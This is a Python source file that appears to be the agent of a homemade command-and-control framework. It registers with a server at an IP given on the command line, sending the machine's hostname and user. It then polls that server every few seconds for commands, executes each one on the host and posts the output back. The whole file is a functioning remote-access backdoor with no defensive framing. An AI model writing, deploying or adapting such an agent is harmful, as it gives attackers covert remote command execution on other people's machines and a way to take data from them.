import requests as rq
from sys import argv
import subprocess
import sys
from functions import *
import time

serverip = ""
agent_id = None

# function to send to server a join request to c2
def connect():
    r = rq.post(f"http://{serverip}/join", params={
        'hostname': get_hostname(),
        'user': get_whoami()
    }).json()
    print(r)
    if r["status"]:
        print("[+] connected to server successfully, id =", r["id"])
        return r["id"]
    return None


def check_commands():
    r = rq.get(f"http://{serverip}/agent/get_commands/{agent_id}")
    commands = r.json()['commands']
    if commands:
        print("[+] got new commands !!")
        print("[+] commands =", commands)
    return commands

def execute(command: str):
    result = execute_command(command)
    return result

def send_result(commands: list[dict[int, str]]):
    r = rq.post(f"http://{serverip}/agent/set_commands", json={"agent_id": agent_id, "commands": commands})
    print(r.json())


def main():
    if len(argv) != 2:
        print("Usage: python main.py <ip>")
        return
    global agent_id
    global serverip
    serverip = argv[1]
    agent_id = connect()
    results = []
    print(type(agent_id))
    while True:
        results.clear()
        time.sleep(3)
        commands = check_commands()
        for command in commands:
            result = execute(command['command'])
            results.append({"command_id": command["command_id"], "result": result})
        if commands:
            send_result(results)







main()